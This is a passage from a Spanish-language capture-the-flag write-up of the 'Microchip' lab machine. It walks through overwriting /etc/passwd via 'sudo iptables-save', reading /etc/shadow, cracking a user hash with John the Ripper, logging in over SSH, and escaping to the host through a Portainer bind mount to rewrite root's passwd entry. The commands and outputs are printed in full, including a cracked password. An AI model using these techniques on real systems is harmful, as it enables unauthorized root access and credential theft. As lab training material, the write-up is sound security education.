Guardamos la regla en el archivo deseado, siendo el `/etc/passwd`:
```bash
www-data@62ca60255545:/var/www/prestashop$ sudo iptables-save -f /etc/passwd
```

Por último, probamos si funcionó autenticándonos como **Root** y usando la contraseña que escogimos:
```bash
www-data@62ca60255545:/var/www/prestashop$ su root
Password: 
root@62ca60255545:/var/www/prestashop# whoami
root
```
Ya somos **Root**.

El problema aquí es que no tenemos ninguna flag ni del usuario ni del **Root**:
```bash
root@62ca60255545:/var/www/prestashop# cd /root
root@62ca60255545:~# ls -la
total 44
drwx------ 1 root root 4096 Apr 25  2025 .
drwxr-xr-x 1 root root 4096 Apr 25  2025 ..
lrwxrwxrwx 1 root root    9 Apr 25  2025 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 4 root root 4096 Apr 25  2025 .cache
drwxr-xr-x 3 root root 4096 Apr 25  2025 .composer
drwx------ 3 root root 4096 Apr 25  2025 .launchpadlib
drwxr-xr-x 1 root root 4096 Apr 25  2025 .local
drwxr-xr-x 5 root root 4096 Apr 25  2025 .npm
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
-rw------- 1 root root    0 Apr 25  2025 .python_history
drwx------ 2 root root 4096 Apr 25  2025 .ssh
-rw-r--r-- 1 root root  248 Apr 25  2025 .wget-hsts
root@62ca60255545:~# la -la /home/kike/
total 20
drwxr-x--- 2 1001 kike 4096 Apr 25  2025 .
drwxr-xr-x 1 root root 4096 Apr 25  2025 ..
lrwxrwxrwx 1 1001 kike    9 Apr 25  2025 .bash_history -> /dev/null
-rw-r--r-- 1 1001 kike  220 Apr 25  2025 .bash_logout
-rw-r--r-- 1 1001 kike 3771 Apr 25  2025 .bashrc
-rw-r--r-- 1 1001 kike  807 Apr 25  2025 .profile
```
Debemos encontrar una forma de escapar de este contenedor.

### Crackeando Contraseña del Usuario kike del Archivo /etc/shadow {#Cracking}

Si revisamos el archivo `/etc/shadow`, encontraremos el hash de la contraseña del **usuario kike**:
```bash
root@62ca60255545:~# cat /etc/shadow
...
kike:$6$80f9cd16f4cd91f8$Vyinwb3YvcD8zOm0jmeEyT4oJptpkcnjPE/OMA0qFlApow4T9562N7yZD2o/TxirEsKAopSZamfG/2iif/xMI/:20203:0:99999:7:::
```

Podemos intentar crackear este hash; solo copia hasta donde termina el hash y guárdalo en un archivo:
```bash
cat kikeHash
kike:$6$80f9cd16f4cd91f8$Vyinwb3YvcD8zOm0jmeEyT4oJptpkcnjPE/OMA0qFlApow4T9562N7yZD2o/TxirEsKAopSZamfG/2iif/xMI/
```

Utilizaremos la herramienta **JohnTheRipper** para crackear el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt kikeHash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********  (kike)     
1g 0:00:00:06 DONE (2026-02-09 18:08) 0.1602g/s 2276p/s 2276c/s 2276C/s goodman..community
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Probemos si funciona contra el **servicio SSH** de la máquina víctima usando la herramienta **netexec**:
```bash
nxc ssh 192.168.100.190 -u 'kike' -p '**********'
SSH         192.168.100.190   22     192.168.100.190    [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5
SSH         192.168.100.190   22     192.168.100.190    [+] kike:qwertyuiopasdfg  Linux - Shell access!
```
Sí funciona.

Entremos al **SSH**:
```bash
ssh kike@192.168.100.190
kike@192.168.100.190's password: 
Linux TheHackersLabs-Microchip 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
Last login: Sun Feb  8 06:38:08 2026
kike@TheHackersLabs-Microchip:~$
```
Estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
kike@TheHackersLabs-Microchip:~$ ls
user.txt
kike@TheHackersLabs-Microchip:~$ cat user.txt
...
```

### Escalando Privilegios con Portainer {#Portainer}

Dentro de la máquina víctima no hay mucho que podamos hacer; sin embargo, probando las mismas credenciales del **usuario kike**, logramos ganar acceso al portal de **Portainer**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura14.png">
</p>

Ahí mismo podemos ver que se puede gestionar el contenedor actual.

Si entramos ahí, veremos que hay 2 contenedores activos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura15.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura16.png">
</p>

Investigando una forma de escalar privilegios con esta herramienta, encontré el siguiente blog:
* <a href="https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/" target="_blank">Use Portainer for Privilege Escalation</a>

Aunque se muestra una versión de Portainer un poco vieja, el procedimiento es casi el mismo.

La idea es crear una montura de la máquina víctima dentro de un contenedor, de manera que cualquier modificación que realicemos se vea reflejada en la máquina principal.

Primero, le damos al botón **Add Container**, le damos nombre al contenedor y escogemos una imagen:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura17.png">
</p>

Bajando a la sección avanzada, escogemos la opción **Interactive & TTY**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura18.png">
</p>

Ahí mismo, cambiamos a la sección **Volumes** e indicamos dónde se guardará la montura (importante usar la opción **Bind**), y le indicamos el path que se tomará para crear la montura, siendo la raíz de la máquina víctima:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura19.png">
</p>

Por último, creamos el contenedor:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura20.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura21.png">
</p>

Ahí está creado nuestro contenedor.

Entra ahí y en la sección **Container Status**, verás una opción que es para obtener una consola interactiva; dale clic y activa la consola dándole al botón **Connect**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura22.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura23.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura24.png">
</p>

Listo, tenemos una consola interactiva.

Podemos buscar la flag del **Root** en la ruta `/mnt/root/root`:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura25.png">
</p>

Con esto, podemos dar por terminada la máquina, pero gracias a la opción **Bind**, podemos realizar cambios en este contenedor que se verán reflejados en la máquina principal.

Entonces, podemos aplicar el mismo método de cambiar la contraseña del **Root** como lo hicimos en el primer contenedor.

Creamos una contraseña con **openssl**:
```bash
kike@TheHackersLabs-Microchip:~$ openssl passwd jakiado123
$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/
```

Sobreescribimos el archivo `/etc/passwd` con el comando **sed** y usando el hash que obtuvimos anteriormente:
```bash
sed -i 's|^root:x:|root:$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/:0:0:root:/root:/bin/bash|' /mnt/root/etc/passwd
```

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura26.png">
</p>

Funciona, podemos comprobar que se realizo el cambio si en nuestra sesión del **SSH** vemos el archivo `/etc/passwd`:
```bash
kike@TheHackersLabs-Microchip:~$ cat /etc/passwd | grep 'bash'
root:$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/:0:0:root:/root:/bin/bash
kike:x:1001:1001:,,,:/home/kike:/bin/bash
```

Ya solo nos autenticamos como **Root** en esta sesión:
```bash
kike@TheHackersLabs-Microchip:~$ su root
Contraseña: 
root@TheHackersLabs-Microchip:/home/kike# whoami
root
```
Somos **Root**.

Y obtenemos la última flag:
```bash
root@TheHackersLabs-Microchip:/home/kike# cd /root
root@TheHackersLabs-Microchip:~# ls
prestashop  root.txt
root@TheHackersLabs-Microchip:~# cat root.txt
...
```
Con esto, terminamos la máquina.
